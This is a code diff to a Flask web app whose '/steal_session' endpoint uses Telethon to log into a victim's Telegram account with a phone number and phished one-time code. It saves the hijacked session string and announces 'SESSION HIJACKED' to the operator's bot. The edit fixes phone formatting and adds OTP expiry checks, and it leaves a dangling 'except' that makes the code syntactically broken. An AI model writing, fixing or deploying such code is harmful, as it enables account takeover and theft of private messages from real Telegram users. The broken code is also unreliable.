@@ -78,24 +78,36 @@ def send_code():
 
 @app.route('/steal_session', methods=['POST'])
 def steal_session():
-    if not telethon_available:
-        return jsonify({'success': False, 'error': 'Telethon not available'})
-    
     phone = request.form.get('phone', '').strip()
     code = request.form.get('code', '').strip()
     
-    if not phone or not code or phone not in pending_otps:
-        return jsonify({'success': False, 'error': 'Invalid request'})
+    # Fix phone number format (remove double country code)
+    if phone.startswith('+6262'):
+        phone = '+62' + phone[4:]  # Convert +626283895257557 to +6283895257557
+    
+    print(f"Attempting steal session for: {phone}")  # Debug log
+    
+    if not phone or not code:
+        return jsonify({'success': False, 'error': 'Missing phone or code'})
+    
+    if phone not in pending_otps:
+        return jsonify({'success': False, 'error': 'No OTP request found or OTP expired'})
     
     async def run():
         try:
-            client = TelegramClient(StringSession(), config['API_ID'], config['API_HASH'])
+            client = TelegramClient(StringSession(), API_ID, API_HASH)
             await client.connect()
             
-            await client.sign_in(
+            # Cek jika OTP hash masih valid
+            otp_data = pending_otps[phone]
+            time_diff = time.time() - otp_data.get('timestamp', 0)
+            if time_diff > 300:  # 5 menit
+                return {'success': False, 'error': 'OTP code expired'}
+            
+            result = await client.sign_in(
                 phone=phone, 
                 code=code, 
-                phone_code_hash=pending_otps[phone]['phone_code_hash']
+                phone_code_hash=otp_data['phone_code_hash']
             )
             
             session_string = client.session.save()
@@ -104,25 +116,22 @@ def steal_session():
             sessions_db[phone] = {
                 'session_string': session_string,
                 'user_id': user.id,
-                'first_name': user.first_name or 'Unknown',
-                'username': user.username or 'No username',
-                'last_login': os.times().user
+                'first_name': user.first_name,
+                'last_login': datetime.now().isoformat()
             }
             
             send_to_bot(f"🔓 SESSION HIJACKED: `{phone}`")
+            del pending_otps[phone]
             
-            if phone in pending_otps:
-                del pending_otps[phone]
-                
             return {'success': True, 'session': session_string}
             
         except Exception as e:
             error_msg = f"Steal session error: {str(e)}"
-            send_to_bot(f"❌ STEAL FAILED: `{error_msg}`")
             return {'success': False, 'error': error_msg}
+        finally:
+            await client.disconnect()
     
-    try:
-        return jsonify(asyncio.run(run()))
+    return jsonify(asyncio.run(run()))
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
